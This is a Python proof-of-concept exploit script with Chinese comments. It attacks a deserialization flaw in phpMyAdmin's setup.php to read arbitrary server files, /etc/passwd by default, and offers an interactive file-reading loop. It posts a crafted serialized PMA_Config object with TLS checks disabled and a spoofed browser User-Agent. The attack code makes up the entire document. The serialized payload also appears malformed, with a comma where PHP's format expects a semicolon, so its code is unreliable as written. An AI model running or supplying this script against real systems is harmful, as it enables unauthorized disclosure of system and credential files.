#!/usr/bin/env python3
"""
phpMyAdmin setup.php 反序列化文件读取 POC
用法：
    python3 phpmyadmin_setup_rce.py -u http://target:8080 -f /etc/passwd
    python3 phpmyadmin_setup_rce.py -u http://target:8080 --shell  # 交互式文件读取
"""

import requests
import sys
import argparse
import re

requests.packages.urllib3.disable_warnings()

def read_file(target_url, file_path):
    """通过反序列化漏洞读取指定文件内容"""
    vuln_path = "/scripts/setup.php"
    url = target_url.rstrip('/') + vuln_path

    # 构造序列化 payload：PMA_Config 对象的 source 属性设置为目标文件路径
    # 注意字符串长度必须准确：s:6:"source" s:11:"/etc/passwd" 长度随文件路径变化
    file_len = len(file_path)
    payload = f'O:10:"PMA_Config":1:{{s:6:"source",s:{file_len}:"{file_path}";}}'

    data = {
        "action": "test",
        "configuration": payload
    }

    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)",
        "Accept": "*/*"
    }

    try:
        resp = requests.post(url, data=data, headers=headers, timeout=10, verify=False)
        # 尝试提取文件内容，通常在响应中序列化对象的 source 后会跟着文件内容
        # 不同版本响应格式可能不同，这里返回完整的原始响应文本以供分析
        return resp.text
    except requests.exceptions.ConnectionError:
        return "[-] 连接失败，目标不可达。"
    except Exception as e:
        return f"[-] 请求出错: {e}"

def interactive_shell(target_url):
    """交互式读取文件"""
    print("[+] 交互模式 - 输入文件绝对路径读取，输入 'exit' 退出。")
    while True:
        try:
            path = input("file> ").strip()
            if path.lower() in ("exit", "quit"):
                break
            if not path:
                continue
            content = read_file(target_url, path)
            # 尝试美化输出（如果响应是序列化数据，可能包含文件内容）
            # 常见成功响应会包含 "Fatal error" 或直接显示文件内容，简单打印
            print(content)
            print("-" * 40)
        except KeyboardInterrupt:
            print("\n[!] 退出。")
            break

def main():
    parser = argparse.ArgumentParser(description="phpMyAdmin setup.php 反序列化文件读取 POC")
    parser.add_argument("-u", "--url", required=True, help="目标基础 URL，例如 http://192.168.1.100:8080")
    parser.add_argument("-f", "--file", default="/etc/passwd", help="要读取的文件路径，默认 /etc/passwd")
    parser.add_argument("--shell", action="store_true", help="进入交互式文件读取模式")
    args = parser.parse_args()

    if args.shell:
        interactive_shell(args.url)
    else:
        print(f"[*] 目标: {args.url}\n[*] 读取文件: {args.file}")
        result = read_file(args.url, args.file)
        print("[+] 响应内容:")
        print(result)

if __name__ == "__main__":
    main()